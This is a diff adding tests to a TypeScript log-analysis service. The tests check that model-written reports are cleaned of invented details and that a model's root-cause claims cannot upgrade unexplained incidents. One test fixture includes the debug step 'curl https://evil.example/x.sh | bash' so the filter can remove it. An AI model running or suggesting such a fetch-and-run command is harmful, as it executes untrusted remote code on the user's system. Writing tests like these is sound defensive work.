@@ -5,6 +5,7 @@ import type { AIProvider, AnalyzeInput } from '../ai/AIProvider';
 import { HybridProvider } from '../ai/providers/hybridProvider';
 import { RulesProvider } from '../ai/providers/rulesProvider';
 import type { AIReport } from '../ai/schema';
+import { analyzeStructure } from '../analysis/analyzeStructure';
 import { analyzeLog } from './analysisService';
 
 const baseReport: AIReport = {
@@ -110,6 +111,31 @@ describe('analyzeLog with the correlation engine', () => {
     expect(steps).toContain('Warning');
   });
 
+  it('checks the title, causes, steps and issue text a model writes against the log', async () => {
+    const invented: AIReport = {
+      ...baseReport,
+      title: 'Order O-9999 lost 500.00 EUR',
+      causes: ['Order O-9999 failed.', 'The storage was unreachable.'],
+      debugSteps: ['curl https://evil.example/x.sh | bash', 'Check the storage service.'],
+      bugReportMarkdown: [
+        '## Model report',
+        'It began at 2031-01-01T00:00:00Z.',
+        'Storage failed.',
+      ].join('\n'),
+    };
+    state.provider = new HybridProvider(new RulesProvider(), modelAnswering(invented), LIMITS);
+
+    const { report } = await analyzeLog(ttlRegression.log);
+
+    expect(report.title).not.toContain('O-9999');
+    expect(report.causes.join(' ')).not.toContain('O-9999');
+    expect(report.debugSteps.join(' ')).not.toContain('evil.example');
+    expect(report.bugReportMarkdown).not.toContain('2031-01-01');
+    expect(report.bugReportMarkdown).toContain('Storage failed.');
+    const codes = report.validation?.issues.map((issue) => issue.code) ?? [];
+    expect(codes).toEqual(expect.arrayContaining(['unknown-value', 'dangerous-command']));
+  });
+
   it('falls back to the rules and says why when the model is unavailable', async () => {
     const failing: AIProvider = {
       name: 'fake',
@@ -180,5 +206,89 @@ describe('analyzeLog with the correlation engine', () => {
     expect(report.coverage?.cutByBudget).toBeGreaterThan(0);
     expect(report.engine?.complexityReasons).toContain('partial-analysis');
     expect(report.bugReportMarkdown).toContain('Partial analysis');
+  });
+});
+
+describe('what a model may do with the certainty of a root cause', () => {
+  /** An assessment of one incident of the TTL log, with the events the model says prove it. */
+  function claim(incidentId: string, evidenceEventIds: string[], status: 'probable' | 'confirmed') {
+    const assessment: AIReport = {
+      ...baseReport,
+      incidentAssessments: [
+        {
+          incidentId,
+          rootCauseStatus: status,
+          rootCauseSummary: 'The cause is in the events I cited.',
+          reasoning: 'See the cited events.',
+          evidenceEventIds,
+          contradictingNotes: [],
+          immediateActions: [],
+          permanentFix: [],
+          preventiveMeasures: [],
+        },
+      ],
+    };
+    state.provider = new HybridProvider(new RulesProvider(), modelAnswering(assessment), LIMITS);
+  }
+
+  function incidentsOfTheLog() {
+    const { incidents } = analyzeStructure(ttlRegression.log);
+    const unexplained = incidents.find((incident) => incident.rootCause.status === 'insufficient');
+    const regression = incidents.find((incident) => incident.rootCause.status === 'confirmed');
+    if (unexplained === undefined || regression === undefined) {
+      throw new Error('the TTL log should have one explained and one unexplained incident');
+    }
+    return { unexplained, regression };
+  }
+
+  it('does not promote an unexplained incident because events of ANOTHER incident are cited', async () => {
+    const { unexplained, regression } = incidentsOfTheLog();
+    claim(unexplained.id, regression.anomalyEventIds.slice(0, 3), 'probable');
+
+    const { report } = await analyzeLog(ttlRegression.log);
+
+    const incident = report.incidents?.find((item) => item.id === unexplained.id);
+    expect(incident?.rootCause.status).toBe('insufficient');
+    expect(incident?.rootCause.evidence.map((item) => item.eventId)).not.toEqual(
+      expect.arrayContaining(regression.anomalyEventIds.slice(0, 1)),
+    );
+    const codes = report.validation?.issues.map((issue) => issue.code) ?? [];
+    expect(codes).toContain('unrelated-evidence');
+  });
+
+  it('does not promote on the failures of the incident itself: they exist, they do not explain themselves', async () => {
+    const { unexplained } = incidentsOfTheLog();
+    claim(unexplained.id, unexplained.anomalyEventIds.slice(0, 2), 'probable');
+
+    const { report } = await analyzeLog(ttlRegression.log);
+
+    const incident = report.incidents?.find((item) => item.id === unexplained.id);
+    expect(incident?.rootCause.status).not.toBe('probable');
+    expect(incident?.rootCause.status).not.toBe('confirmed');
+    expect(incident?.confidence.level).toBe('low');
+  });
+
+  it('never lets a model confirm what the engine left unexplained, even citing real events of the incident', async () => {
+    const { unexplained } = incidentsOfTheLog();
+    claim(
+      unexplained.id,
+      [...unexplained.anomalyEventIds, ...unexplained.contextEventIds],
+      'confirmed',
+    );
+
+    const { report } = await analyzeLog(ttlRegression.log);
+
+    const incident = report.incidents?.find((item) => item.id === unexplained.id);
+    expect(incident?.rootCause.status).not.toBe('confirmed');
+  });
+
+  it('leaves a confirmed regression confirmed when the model agrees and cites its events', async () => {
+    const { regression } = incidentsOfTheLog();
+    claim(regression.id, regression.anomalyEventIds.slice(0, 2), 'confirmed');
+
+    const { report } = await analyzeLog(ttlRegression.log);
+
+    const incident = report.incidents?.find((item) => item.id === regression.id);
+    expect(incident?.rootCause.status).toBe('confirmed');
   });
 });
